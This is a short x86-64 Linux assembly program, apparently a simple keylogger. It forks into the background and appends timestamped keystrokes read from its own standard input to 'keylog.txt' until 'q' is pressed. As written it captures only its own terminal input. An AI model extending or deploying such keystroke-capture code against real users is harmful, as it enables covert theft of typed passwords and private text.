section .data
    fname db "keylog.txt", 0
    fd dq 0                
    tbuf db 64 dup(0)      
    nl db 0xa            
    s db " | ", 0          
    dpid dq 0           

section .bss
    buf resb 1             
    tspec resq 2           

section .text
global _start

_start:
    ; fork
    mov rax, 57           
    syscall
    
    cmp rax, 0
    je child              
    mov [dpid], rax      
    jmp parent           

child:
    ; init
    mov rax, 2            
    mov rdi, fname
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall
    
    mov [fd], rax        

loop:
    ; time
    mov rax, 228         
    mov rdi, 0           
    mov rsi, tspec
    syscall

    ; read
    mov rax, 0                
    mov rdi, 0                
    mov rsi, buf
    mov rdx, 1                
    syscall

    ; check q
    cmp byte [buf], 'q'
    je exit

    ; format
    mov rax, [tspec]
    mov rdi, tbuf
    call ft

    ; write time
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, tbuf
    mov rdx, 20              
    syscall

    ; write sep
    mov rax, 1
    mov rdi, [fd]
    mov rsi, s
    mov rdx, 3
    syscall

    ; write key
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    ; write nl
    mov rax, 1
    mov rdi, [fd]
    mov rsi, nl
    mov rdx, 1
    syscall

    jmp loop

parent:
    mov rax, 60              
    xor rdi, rdi
    syscall

exit:
    mov rax, 3                
    mov rdi, [fd]
    syscall

    mov rax, 60               
    xor rdi, rdi
    syscall

ft:
    push rbx
    push rcx
    
    mov rbx, 10             
    add rdi, 19             
    mov byte [rdi], 0       
    
    mov rcx, 19            
.l:
    dec rdi
    xor rdx, rdx
    div rbx
    add dl, '0'
    mov [rdi], dl
    dec rcx
    test rax, rax
    jnz .l
    
    pop rcx
    pop rbx
    ret